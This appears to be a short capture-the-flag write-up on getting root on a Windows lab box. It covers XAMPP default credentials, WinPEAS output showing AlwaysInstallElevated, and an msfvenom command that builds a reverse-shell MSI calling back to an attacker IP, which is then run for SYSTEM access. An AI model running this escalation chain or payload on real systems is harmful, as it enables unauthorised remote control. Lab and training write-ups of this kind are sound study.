# Getting Root

* password.txt
``` powershell
gc passwords.txt
### XAMPP Default Passwords ###

1) MySQL (phpMyAdmin):

   User: root
   Password:
   (means no password!)

2) FileZilla FTP:

   [ You have to create a new user on the FileZilla Interface ] 

3) Mercury (not in the USB & lite version): 

   Postmaster: Postmaster (postmaster@localhost)
   Administrator: Admin (admin@localhost)

   User: newuser  
   Password: wampp 

4) WEBDAV: 

   User: xampp-dav-unsecure
   Password: ppmax2011
   Attention: WEBDAV is not active since XAMPP Version 1.7.4.
   For activation please comment out the httpd-dav.conf and
   following modules in the httpd.conf
   
   LoadModule dav_module modules/mod_dav.so
   LoadModule dav_fs_module modules/mod_dav_fs.so  
   
   Please do not forget to refresh the WEBDAV authentification (users and passwords).     
PS C:\xampp> 
```

### Running Winpeas on machine
```bash
???????????? Checking AlwaysInstallElevated                                                                                                                                                   
?  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated                                                                                               
    AlwaysInstallElevated set to 1 in HKLM!                                                                                                                                                   
    AlwaysInstallElevated set to 1 in HKCU!
```
https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated
* AlwaysInstallElevated: **If** these 2 registers are **enabled** (value is **0x1**), then users of any privilege can **install** (execute) `***.msi**` files as NT AUTHORITY\**SYSTEM**.

### MSFvenom payload
```bash
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.21 LPORT=9001 -f msi > payload.msi
```

download on the machine the payload and execute

![[Pasted image 20211226143828.png]]

![[Pasted image 20211226143840.png]]

